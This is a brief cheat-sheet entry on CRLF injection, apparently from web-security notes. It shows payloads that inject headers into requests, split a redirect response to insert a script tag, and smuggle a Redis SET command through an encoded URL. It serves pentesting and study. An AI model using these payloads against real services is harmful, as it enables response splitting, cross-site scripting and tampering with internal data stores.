# CRLF Injection
- Inject `\r\n` to headers

  ```txt
  request("http://host/ HTTP/1.1\r\nHeader: xxx\r\nX:")
  -----------------------------------------------------
  GET / HTTP/1.1\r\n
  Header: xxx
  X:` HTTP/1.1\r\n
  Host: host\r\n
  ...
  ```

  ```txt
  ?redirect=http://example.com/%0d%0a%0d%0a...
  --------------------------------------------
  HTTP/1.1 302 Found
  Content-Length: 35\r\n
  Content-Type: text/html; charset=UTF-8\r\n
  ...
  Location: https://example.com\r\n
  \r\n
  <script>alert(1)</script>
  ...
  Server: Apache/2.4.41\r\n
  \r\n
  Redirecting to <a href="/">/</a> ...
  ```

- Redis

  ```
  http://127.0.0.1:6379/%0D%0ASET%20key%20"value"%0D%0A
  -----------------------------------------------------
  SET key "value"\r\n
  ```
